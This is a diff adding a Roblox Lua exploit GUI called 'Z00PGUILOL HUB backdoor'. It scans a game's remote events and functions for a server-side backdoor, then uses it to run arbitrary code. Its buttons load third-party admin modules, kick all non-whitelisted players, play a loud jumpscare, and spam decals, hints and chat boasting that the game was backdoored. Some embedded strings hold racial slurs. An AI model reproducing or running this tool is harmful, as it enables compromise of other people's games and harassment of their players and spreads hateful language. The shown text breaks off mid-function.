@@ -1,0 +1,1271 @@
+local PLAYER_NAME = game:GetService("Players").LocalPlayer.Name
+-- Instances: 18 | Scripts: 9990 | Modules: 0 | Tags: 0
+local LMG2L = {};
+
+-- Players.dipayy24.PlayerGui.anjingyes
+LMG2L["anjingyes_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["anjingyes_1"]["Name"] = [[anjingyes]];
+LMG2L["anjingyes_1"]["ResetOnSpawn"] = false;
+LMG2L["anjingyes_1"]["DisplayOrder"] = 999999;
+LMG2L["anjingyes_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame
+LMG2L["MainFrame_4"] = Instance.new("Frame", LMG2L["anjingyes_1"]);
+LMG2L["MainFrame_4"]["Active"] = true;
+LMG2L["MainFrame_4"]["BorderSizePixel"] = 0;
+LMG2L["MainFrame_4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["MainFrame_4"]["Size"] = UDim2.new(0, 572, 0, 270);
+LMG2L["MainFrame_4"]["Position"] = UDim2.new(0, 232, 0, 52);
+LMG2L["MainFrame_4"]["Name"] = [[MainFrame]];
+
+-- Players.dipayy24.PlayerGui.anjingyes.ImageButton
+LMG2L["ImageButton_2"] = Instance.new("ImageButton", LMG2L["anjingyes_1"]);
+LMG2L["ImageButton_2"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageButton_2"]["Image"] = [[rbxassetid://80970671139625]];
+LMG2L["ImageButton_2"]["Size"] = UDim2.new(0, 76, 0, 74);
+LMG2L["ImageButton_2"]["Position"] = UDim2.new(0, 20, 0, 106);
+
+LMG2L["UIDragDetector_3"] = Instance.new("UIDragDetector", LMG2L["ImageButton_2"]);
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.scan
+LMG2L["scan_5"] = Instance.new("TextButton", LMG2L["MainFrame_4"]);
+LMG2L["scan_5"]["TextWrapped"] = true;
+LMG2L["scan_5"]["BorderSizePixel"] = 2;
+LMG2L["scan_5"]["TextScaled"] = true;
+LMG2L["scan_5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["scan_5"]["BackgroundColor3"] = Color3.fromRGB(4, 4, 4);
+LMG2L["scan_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/PatrickHand.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["scan_5"]["Size"] = UDim2.new(0, 522, 0, 138);
+LMG2L["scan_5"]["Text"] = [[Scan Backdoor]];
+LMG2L["scan_5"]["Name"] = [[scan]];
+LMG2L["scan_5"]["Position"] = UDim2.new(0, 20, 0, 74);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.scan.UIGradient
+LMG2L["UIGradient_6"] = Instance.new("UIGradient", LMG2L["scan_5"]);
+LMG2L["UIGradient_6"]["Rotation"] = 100;
+LMG2L["UIGradient_6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 7, 7)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(190, 255, 206)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(190, 255, 213)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(56, 0, 255))};
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS
+LMG2L["UIS_7"] = Instance.new("Frame", LMG2L["MainFrame_4"]);
+LMG2L["UIS_7"]["Visible"] = false;
+LMG2L["UIS_7"]["BorderSizePixel"] = 0;
+LMG2L["UIS_7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["UIS_7"]["Size"] = UDim2.new(0, 438, 0, 220);
+LMG2L["UIS_7"]["Position"] = UDim2.new(0, 2, 0, 48);
+LMG2L["UIS_7"]["Name"] = [[UIS]];
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.tai
+LMG2L["tai_8"] = Instance.new("TextButton", LMG2L["UIS_7"]);
+LMG2L["tai_8"]["TextWrapped"] = true;
+LMG2L["tai_8"]["BorderSizePixel"] = 2;
+LMG2L["tai_8"]["TextScaled"] = true;
+LMG2L["tai_8"]["BackgroundColor3"] = Color3.fromRGB(255, 213, 30);
+LMG2L["tai_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["tai_8"]["Size"] = UDim2.new(0, 88, 0, 50);
+LMG2L["tai_8"]["Text"] = [[hide Text]];
+LMG2L["tai_8"]["Name"] = [[tai]];
+LMG2L["tai_8"]["Position"] = UDim2.new(0, 204, 0, 162);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.tai
+LMG2L["tai_9"] = Instance.new("TextButton", LMG2L["UIS_7"]);
+LMG2L["tai_9"]["TextWrapped"] = true;
+LMG2L["tai_9"]["BorderSizePixel"] = 2;
+LMG2L["tai_9"]["TextScaled"] = true;
+LMG2L["tai_9"]["BackgroundColor3"] = Color3.fromRGB(255, 213, 30);
+LMG2L["tai_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["tai_9"]["Size"] = UDim2.new(0, 88, 0, 50);
+LMG2L["tai_9"]["Text"] = [[execute]];
+LMG2L["tai_9"]["Name"] = [[tai]];
+LMG2L["tai_9"]["Position"] = UDim2.new(0, 8, 0, 164);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.ScrollingFrame
+LMG2L["ScrollingFrame_a"] = Instance.new("ScrollingFrame", LMG2L["UIS_7"]);
+LMG2L["ScrollingFrame_a"]["BorderSizePixel"] = 2;
+LMG2L["ScrollingFrame_a"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar;
+LMG2L["ScrollingFrame_a"]["BackgroundColor3"] = Color3.fromRGB(223, 222, 222);
+LMG2L["ScrollingFrame_a"]["Size"] = UDim2.new(0, 224, 0, 210);
+LMG2L["ScrollingFrame_a"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 165, 124);
+LMG2L["ScrollingFrame_a"]["Position"] = UDim2.new(0, 340, 0, 2);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.ScrollingFrame.TextLabel
+LMG2L["TextLabel_b"] = Instance.new("TextLabel", LMG2L["ScrollingFrame_a"]);
+LMG2L["TextLabel_b"]["TextWrapped"] = true;
+LMG2L["TextLabel_b"]["TextStrokeTransparency"] = 0;
+LMG2L["TextLabel_b"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_b"]["TextStrokeColor3"] = Color3.fromRGB(253, 253, 253);
+LMG2L["TextLabel_b"]["TextScaled"] = true;
+LMG2L["TextLabel_b"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
+LMG2L["TextLabel_b"]["TextColor3"] = Color3.fromRGB(22, 33, 42);
+LMG2L["TextLabel_b"]["Size"] = UDim2.new(0, 222, 0, 12);
+LMG2L["TextLabel_b"]["Text"] = [[File Script]];
+LMG2L["TextLabel_b"]["Position"] = UDim2.new(0, 2, 0, -2);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.tai
+LMG2L["tai_c"] = Instance.new("TextButton", LMG2L["UIS_7"]);
+LMG2L["tai_c"]["TextWrapped"] = true;
+LMG2L["tai_c"]["BorderSizePixel"] = 2;
+LMG2L["tai_c"]["TextScaled"] = true;
+LMG2L["tai_c"]["BackgroundColor3"] = Color3.fromRGB(255, 213, 30);
+LMG2L["tai_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["tai_c"]["Size"] = UDim2.new(0, 88, 0, 50);
+LMG2L["tai_c"]["Text"] = [[clear]];
+LMG2L["tai_c"]["Name"] = [[tai]];
+LMG2L["tai_c"]["Position"] = UDim2.new(0, 106, 0, 164);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.UIGradient
+LMG2L["UIGradient_d"] = Instance.new("UIGradient", LMG2L["UIS_7"]);
+LMG2L["UIGradient_d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(97, 97, 97)),ColorSequenceKeypoint.new(0.544, Color3.fromRGB(244, 255, 214)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(244, 255, 214))};
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.UIS.TextBox
+LMG2L["TextBox_e"] = Instance.new("TextBox", LMG2L["UIS_7"]);
+LMG2L["TextBox_e"]["TextStrokeTransparency"] = 0;
+LMG2L["TextBox_e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextBox_e"]["BorderSizePixel"] = 2;
+LMG2L["TextBox_e"]["TextWrapped"] = true;
+LMG2L["TextBox_e"]["TextStrokeColor3"] = Color3.fromRGB(29, 202, 225);
+LMG2L["TextBox_e"]["TextSize"] = 15;
+LMG2L["TextBox_e"]["Text"] = [[-- Made by @gavinrgb27 --]]
+LMG2L["TextBox_e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextBox_e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["TextBox_e"]["BackgroundColor3"] = Color3.fromRGB(215, 255, 237);
+LMG2L["TextBox_e"]["Size"] = UDim2.new(0, 288, 0, 154);
+LMG2L["TextBox_e"]["Position"] = UDim2.new(0, 6, 0, 4);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.info
+LMG2L["info_f"] = Instance.new("TextLabel", LMG2L["MainFrame_4"]);
+LMG2L["info_f"]["TextWrapped"] = true;
+LMG2L["info_f"]["BorderSizePixel"] = 2;
+LMG2L["info_f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["info_f"]["TextScaled"] = true;
+LMG2L["info_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["info_f"]["FontFace"] = Font.new([[rbxasset://fonts/families/PatrickHand.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["info_f"]["Size"] = UDim2.new(0, 220, 0, 32);
+LMG2L["info_f"]["Text"] = [[Z00PGUILOL HUB backdoor]];
+LMG2L["info_f"]["Name"] = [[info]];
+LMG2L["info_f"]["Position"] = UDim2.new(0, 62, 0, 4);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.info.ImageLabel
+LMG2L["ImageLabel_10"] = Instance.new("ImageLabel", LMG2L["info_f"]);
+LMG2L["ImageLabel_10"]["BorderSizePixel"] = 2;
+LMG2L["ImageLabel_10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- LMG2L["ImageLabel_10"]["ImageContent"] = ;
+LMG2L["ImageLabel_10"]["Image"] = [[rbxassetid://80970671139625]];
+LMG2L["ImageLabel_10"]["Size"] = UDim2.new(0, 48, 0, 42);
+LMG2L["ImageLabel_10"]["Position"] = UDim2.new(0, -58, 0, -2);
+
+
+-- Players.dipayy24.PlayerGui.anjingyes.MainFrame.info.TextLabel
+LMG2L["TextLabel_11"] = Instance.new("TextLabel", LMG2L["info_f"]);
+LMG2L["TextLabel_11"]["TextWrapped"] = true;
+LMG2L["TextLabel_11"]["BorderSizePixel"] = 2;
+LMG2L["TextLabel_11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_11"]["TextScaled"] = true;
+LMG2L["TextLabel_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/PatrickHand.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextLabel_11"]["Size"] = UDim2.new(0, 144, 0, 32);
+LMG2L["TextLabel_11"]["Text"] = [[Status: idle]];
+LMG2L["TextLabel_11"]["Position"] = UDim2.new(0, 226, 0, 0);
+LMG2L["UIDragDetector_12"] = Instance.new("UIDragDetector", LMG2L["MainFrame_4"]);
+
+--------------============={SCRIPTS ASUUU}===============-------------------
+local gui = LMG2L["anjingyes_1"]
+local MAINYUK = LMG2L["MainFrame_4"]
+local fuck = LMG2L["ImageButton_2"]
+
+fuck.MouseButton1Click:Connect(function()
+ MAINYUK.Visible = not MAINYUK.Visible
+end)
+
+local scan = LMG2L["scan_5"]
+local UIS = LMG2L["UIS_7"]
+local Cody = LMG2L["TextBox_e"]
+local Labely = LMG2L["TextLabel_11"]
+local clearbtn = LMG2L["tai_c"]
+local execute = LMG2L["tai_9"]
+local hide = LMG2L["tai_8"]
+local scrl = LMG2L["ScrollingFrame_a"]
+-- Finish --
+local backdoor = nil
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+
+local function generateName(length)
+    local text = ''
+    for i = 1, length do
+        text = text .. alphabet[math.random(1,#alphabet)]
+    end
+    return text
+end
+
+local function updateStatus(message, color)
+    Labely.Text = "Status: " .. message
+    Labely.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+end
+
+local function runRemote(remote, data)
+    if not remote then return end
+    if remote:IsA("RemoteEvent") then
+        remote:FireServer(data)
+    elseif remote:IsA("RemoteFunction") then
+        task.spawn(function()
+            remote:InvokeServer(data)
+        end)
+    end
+end
+
+local infect = nil
+local foundRemote = nil
+
+local function infected()
+    updateStatus("Scanning Infected...", Color3.fromRGB(255, 255, 255))
+    for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            if Labely then Labely.Text = "Trying: " .. obj.Name end
+            local name = string.lower(obj.Name)
+            if name:find("destroy") or name:find("delete") or name:find("break")
+            or name:find("remove") or name:find("hit") or name:find("kill") then
+                backdoor = obj
+                if Labely then Labely.Text = "Found: " .. obj.Name end
+                
+                UIS.Visible = true
+                scan.Visible = false
+                updateStatus("Infected Found", Color3.fromRGB(255, 255, 255))
+                return true
+            end
+        end
+    end
+    updateStatus("no Backdoor and no infected", Color3.fromRGB(255, 255, 255))
+    return false
+end
+
+local function findRemote()
+    local remotes = {}
+    updateStatus("Starting Scan...", Color3.fromRGB(255, 255, 255))
+
+    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+    
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        local code = generateName(math.random(12,30))
+        local payload = "l=Instance.new(\"Model\",workspace) l.Name='" .. code .. "'"
+        task.spawn(function()
+            protected_backdoor:InvokeServer('nil', payload) 
+        end)
+        remotes[code] = protected_backdoor
+    end
+
+    for i,remote in game:GetDescendants() do
+        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then continue end
+        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then continue end
+        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
+            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then continue end
+            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then continue end
+            if remote.Parent.Name=='DefaultChatSystemChatEvents' then continue end
+        end
+        
+        local code = generateName(math.random(12,30))
+        local payload = "l=Instance.new(\"Model\",workspace) l.Name='" .. code .. "'"
+        runRemote(remote, payload)
+        remotes[code] = remote
+    end
+
+    for i = 1, 100 do
+        updateStatus("Scanning... "..i.."%", Color3.fromRGB(255, 255, 255))
+        for code,remote in remotes do
+            if workspace:FindFirstChild(code) then
+                infect = false
+                backdoor = remote
+                UIS.Visible = true
+                Acqur.Visible = false
+                updateStatus("Backdoor", Color3.fromRGB(255, 255, 255))
+                return true
+            end
+        end
+        task.wait(0.05)
+    end
+
+    updateStatus("no Backdoor", Color3.fromRGB(255, 255, 255))
+    infect = true
+    return false
+end
+
+scan.MouseButton1Click:Connect(function()
+    scan.Text = "Scanning..."
+    task.spawn(function()
+        if not findRemote() then
+            if infect == true then
+                infected()
+            end
+        end
+    end)
+end)
+
+execute.MouseButton1Click:Connect(function()
+local scriptText = Cody.Text
+    if backdoor and scriptText ~= "" then
+        runRemote(backdoor, scriptText)
+        execute.Text = "Executed!"
+        task.wait(0.5)
+        execute.Text = "Execute"
+    else
+        execute.Text = "No script!"
+        task.wait(0.5)
+        execute.Text = "Execute"
+    end
+end)
+
+clearbtn.MouseButton1Click:Connect(function()  
+Cody.Text = ''
+end)
+
+local toggled = false
+
+hide.MouseButton1Click:Connect(function()
+    if toggled then
+        Cody.BackgroundColor3 = Color3.new(1,1,1) -- hitam
+        hide.Text = 'Hide[of]'
+    else
+        Cody.BackgroundColor3 = Color3.new(1,1,0) -- merah
+
+        hide.Text = 'Hide[on]'
+    end
+    toggled = not toggled -- balik status toggle
+end)
+
+local UIList = Instance.new("UIListLayout", scrl)
+UIList.SortOrder = Enum.SortOrder.LayoutOrder
+UIList.Padding = UDim.new(0,3)
+
+local function createFunctionButton(text, callback)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 100, 0, 50)
+    button.Name = text
+    button.BackgroundColor3 = Color3.new(1, 0, 0) 
+    button.TextColor3 = Color3.fromRGB(0, 0, 0)
+    button.Parent = scrl
+    button.Text = text
+    button.TextScaled = true
+    button.MouseButton1Click:Connect(callback)
+
+    -- 🔥 WAJIB DIPINDAH KE SINI (Sebelum return)
+    task.wait()
+    scrl.CanvasSize = UDim2.new(0, 0, 0, UIList.AbsoluteContentSize.Y)
+
+    return button
+end
+createFunctionButton("RESET character", function()
+local codeText = [[
+local Players = game:GetService("Players")
+local player = Players:FindFirstChild("]] .. PLAYER_NAME .. [[")
+if not player or not player.Character then return end
+pcall(function()
+player:LoadCharacter() 
+if player.PlayerGui then
+player.PlayerGui.skidCGT:Destroy() 
+end
+end)
+]]
+runRemote(backdoor, codeText) 
+end) 
+createFunctionButton("Dummy for test", function()
+local codeText = [[
+local Players = game:GetService("Players")
+local player = Players:FindFirstChild("]] .. PLAYER_NAME .. [[")
+if not player or not player.Character then return end
+
+local head = player.Character:FindFirstChild("Head")
+if not head then return end
+
+local function weld(p0, p1, c0)
+	local m = Instance.new("Motor6D")
+	m.Part0 = p0
+	m.Part1 = p1
+	m.C0 = c0
+	m.Parent = p0
+end
+
+local function createADummy(cframe)
+	local dummy = Instance.new("Model")
+	dummy.Name = "Dummy"
+
+	local humanoid = Instance.new("Humanoid")
+	humanoid.RigType = Enum.HumanoidRigType.R6
+	humanoid.Parent = dummy
+
+	local Torso = Instance.new("Part")
+	Torso.Name = "Torso"
+	Torso.Size = Vector3.new(2,2,1)
+	Torso.Parent = dummy
+
+	local Head = Instance.new("Part")
+	Head.Name = "Head"
+	Head.Size = Vector3.new(2,1,1)
+	Head.Parent = dummy
+
+	local LA = Instance.new("Part")
+	LA.Name = "Left Arm"
+	LA.Size = Vector3.new(1,2,1)
+	LA.Parent = dummy
+
+	local RA = Instance.new("Part")
+	RA.Name = "Right Arm"
+	RA.Size = Vector3.new(1,2,1)
+	RA.Parent = dummy
+
+	local LL = Instance.new("Part")
+	LL.Name = "Left Leg"
+	LL.Size = Vector3.new(1,2,1)
+	LL.Parent = dummy
+
+	local RL = Instance.new("Part")
+	RL.Name = "Right Leg"
+	RL.Size = Vector3.new(1,2,1)
+	RL.Parent = dummy
+
+	weld(Torso, Head, CFrame.new(0,1.5,0))
+	weld(Torso, LA, CFrame.new(-1.5,0,0))
+	weld(Torso, RA, CFrame.new(1.5,0,0))
+	weld(Torso, LL, CFrame.new(-0.5,-2,0))
+	weld(Torso, RL, CFrame.new(0.5,-2,0))
+
+	dummy.PrimaryPart = Torso
+	dummy:SetPrimaryPartCFrame(cframe)
+
+	dummy.Parent = workspace
+	return dummy
+end
+
+local spawnCF = head.CFrame * CFrame.new(0,0,-3)
+createADummy(spawnCF)
+]]
+runRemote(backdoor, codeText)
+end)
+createFunctionButton("admin giver", function()
+local codeText = 'require(7192763922).load( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton("happy hub", function()
+local codeText = 'require(135231466738957):Hload( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end) 
+
+createFunctionButton("k00pkidd Gui", function()
+local codeText = 'require(15267263357).V11( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton("777 ililo", function()
+local codeText = 'require(134907549394378)( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton("R6", function()
+local codeText = [[
+local Players = game:GetService("Players")
+local plr = Players:FindFirstChild("]] .. PLAYER_NAME .. [[")
+    if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+        local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
+        local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
+        morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
+        morph.Name = plr.Name
+        plr.Character = morph
+        morph.Parent = workspace    
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton("kick others", function()
+local codeText = [=[
+local Players = game:GetService("Players")
+
+local safeName = "]=]..PLAYER_NAME..[=["
+
+-- whitelist (yang TIDAK akan di kick)
+local whitelist = {
+    ["]=]..PLAYER_NAME..[=["] = true,
+    ["dipayy24"] = true,
+    ["gavinRGB2"] = true,
+    ["Zarchiver7z"] = true,
+    ["sanumCOD"] = true
+}
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    if not whitelist[plr.Name] then
+        pcall(function()
+            plr:Kick("stop🫵🏻💩 kicked by".. safeName)
+        end)
+    end
+end
+]=]
+
+    runRemote(backdoor, codeText)    
+end)
+
+createFunctionButton("Skybox [spinning]", function()
+local skyId = "rbxassetid://80970671139625"
+local sky = Instance.new("Sky")
+sky.Parent = game:GetService("Lighting")
+sky.SkyboxBk = skyId
+sky.SkyboxDn = skyId
+sky.SkyboxFt = skyId
+sky.SkyboxLf = skyId
+sky.SkyboxRt = skyId
+sky.SkyboxUp = skyId
+local RunService = game:GetService("RunService")
+RunService.Heartbeat:Connect(function(dt)
+    local c = sky.SkyboxOrientation
+
+    sky.SkyboxOrientation = Vector3.new(
+        (c.X + 55 * dt) % 360,
+        (c.Y + 45 * dt) % 360,
+        (c.Z + 23 * dt) % 360
+    )
+end)
+end)
+createFunctionButton('jumpscare movie', function()
+local codeText = [[
+local function loadPlayer(player)
+    -- EPSTEIN FUCK NIGER
+    local success, err = pcall(function()
+        require(99511654487292):load(player.Name)
+    end)
+    if not success then
+        warn("Gagal load " .. player.Name .. ": " .. err)
+    end
+end
+-- 1. NIGER
+for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+    loadPlayer(player)
+end
+game:GetService("Players").PlayerAdded:Connect(loadPlayer)
+]]
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton("decal spam", function()
+local de = "rbxassetid://80970671139625"
+function exPro(root)
+			for _, v in pairs(root:GetChildren()) do
+				if v:IsA("Decal") and v.Texture ~= de then
+					v.Parent = nil
+				elseif v:IsA("BasePart") then
+					local One = Instance.new("Decal", v)
+					local Two = Instance.new("Decal", v)
+					local Three = Instance.new("Decal", v)
+					local Four = Instance.new("Decal", v)
+					local Five = Instance.new("Decal", v)
+					local Six = Instance.new("Decal", v)
+					One.Texture = de
+					Two.Texture = de
+					Three.Texture = de
+					Four.Texture = de
+					Five.Texture = de
+					Six.Texture = de
+					One.Face = "Front"
+					Two.Face = "Back"
+					Three.Face = "Right"
+					Four.Face = "Left"
+					Five.Face = "Top"
+					Six.Face = "Bottom"
+				end
+				exPro(v)
+			end
+		end
+		function asdf(root)
+			for _, v in pairs(root:GetChildren()) do
+				asdf(v)
+			end
+		end
+		exPro(game.Workspace)
+		asdf(game.Workspace)
+end)
+createFunctionButton('chat all', function() 
+local codeText = [[
+local Players = game:GetService("Players")
+local Chat = game:GetService("Chat")
+
+for _, player in ipairs(Players:GetPlayers()) do
+	if player.Character and player.Character:FindFirstChild("Head") then
+		Chat:Chat(player.Character.Head, "TEH GAME IS GETTING FUCKS UP BY ZOOPGUI0", Enum.ChatColor.Red)
+	end
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton('face all', function() 
+local codeText = [[
+ngentot = game:GetService("Players")
+for _, v in pairs(ngentot:GetChildren()) do
+			if v.Character:FindFirstChild("Head") then
+				gui1=Instance.new("BillboardGui")
+				gui1.Parent = v.Character.Head
+				gui1.Adornee = v.Character.Head
+				gui1.Size=UDim2.new(2.5,0,2.5,0)
+				gui1.StudsOffset=Vector3.new(0,0.2,0)
+				gui1.AlwaysOnTop = true
+				text1=Instance.new("ImageLabel")
+				text1.Image = "rbxassetid://80970671139625"
+				text1.Size=UDim2.new(1,0,1,0)
+				text1.Position=UDim2.new(0,0,0,0)
+				text1.BackgroundTransparency = 1
+				text1.Parent=gui1
+				v.Character.Head.Transparency = 1
+			end
+		end
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton("Hint spam", function()
+local h1 = "ZOOPGUI0 ON top"
+local h2 ="ZOOPGUI0 BACKDOORED THIS GAME"
+local h3 ="GO FOLLOW ZOOPGUI0 ON TIKTOK @ZOOPGUI0"
+
+local hint = Instance.new("Hint", game:GetService("Workspace")) 
+while true do
+hint.Text=h1
+wait(2) 
+hint.Text=h2
+wait(2) 
+hint.Text=h3
+wait(2) 
+end
+end)
+
+createFunctionButton(' disco', function()
+local codeText = [[
+local Lighting = game:GetService("Lighting")
+local ColorCorrection = Instance.new("ColorCorrectionEffect")
+ColorCorrection.Parent = Lighting
+
+local function zigzag(X)
+	return math.acos(math.cos(X * math.pi)) / math.pi
+end
+
+local Counter = 0
+Lighting.TimeOfDay = "12:00"
+
+while task.wait(0.02) do
+	local color = Color3.fromHSV(zigzag(Counter), 1, 1)
+	ColorCorrection.TintColor = color
+	Lighting.Ambient = color
+	Counter += 0.01
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton("Message spam[same text]", function()
+local h1 = "ZOOPGUI0 ON top"
+local h2 ="ZOOPGUI0 BACKDOORED THIS GAME"
+local h3 ="GO FOLLOW ZOOPGUI0 ON TIKTOK @ZOOPGUI0"
+
+local hint = Instance.new("Message", game:GetService("Workspace")) 
+while true do
+hint.Text=h1
+wait(2) 
+hint.Text=h2
+wait(2) 
+hint.Text=h3
+wait(2) 
+end
+end)
+createFunctionButton('particles ', function() 
+local codeText = [[
+local t1 = "rbxassetid://80970671139625"
+local t2 = "rbxassetid://80970671139625"
+local t3 = "rbxassetid://80970671139625"
+
+local particle = true
+
+if particle == true then
+
+    local function createRotatingParticle(parent, texture)
+        local pe = Instance.new("ParticleEmitter")
+        pe.Texture = texture
+        pe.Rate = 100
+        pe.Size = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 4),
+            NumberSequenceKeypoint.new(1, 0)
+        })
+        
+        pe.Lifetime = NumberRange.new(5, 10)
+        pe.Speed = NumberRange.new(50, 100)
+        pe.VelocitySpread = 360
+        pe.Rotation = NumberRange.new(0, 360)
+        pe.RotSpeed = NumberRange.new(90, 180)
+
+        pe.Parent = parent -- WAJIB parent ke Part
+    end
+
+    -- Ke semua Part langsung di workspace
+    for _, v in ipairs(workspace:GetChildren()) do
+        if v:IsA("Part") then
+            createRotatingParticle(v, t1)
+            createRotatingParticle(v, t2)
+            createRotatingParticle(v, t3)
+        end
+    end
+
+    -- Ke semua part dalam Model
+    for _, model in ipairs(workspace:GetChildren()) do
+        if model:IsA("Model") then
+            for _, part in ipairs(model:GetChildren()) do
+                if part:IsA("Part") then
+                    createRotatingParticle(part, t1)
+                    createRotatingParticle(part, t2)
+                    createRotatingParticle(part, t3)
+                end
+            end
+        end
+    end
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+
+createFunctionButton('jumpscare', function()
+local codeText = [[
+for _, v in pairs(game.Players:GetPlayers()) do
+	if v:FindFirstChild("PlayerGui") and not v.PlayerGui:FindFirstChild("Screamer") then
+		task.spawn(function()
+			local newgui = Instance.new("ScreenGui")
+			newgui.Name = "Screamer"
+			newgui.IgnoreGuiInset = true
+			newgui.ResetOnSpawn = false
+			newgui.DisplayOrder = 10000
+			newgui.Parent = v.PlayerGui
+
+			local newimage = Instance.new("ImageLabel")
+			newimage.Parent = newgui
+			newimage.Size = UDim2.new(1, 0, 1, 0)
+			newimage.Position = UDim2.new(0, 0, 0, 0)
+			newimage.BackgroundTransparency = 0
+			newimage.Image = "rbxassetid://80970671139625"
+
+			local s = Instance.new("Sound")
+			s.SoundId = "rbxassetid://9069609200"
+			s.Volume = 10
+			s.Looped = false
+			s.Parent = newgui
+         local fx = Instance.new("DistortionSoundEffect", s) 
+         fx.Level = 1
+			s:Play()
+
+			wait(9.5487)
+			newgui:Destroy()
+		end)
+	end
+end
+]]
+runRemote(backdoor, codeText) 
+end)
+createFunctionButton('music wont stop us', function() 
+local codeText = [[
+local y = Instance.new("Sound")
+y.Name = "😭😭"
+y.SoundId = "rbxassetid://1847661821"
+y.Pitch = 1
+y.Looped = true
+y.Volume = 10
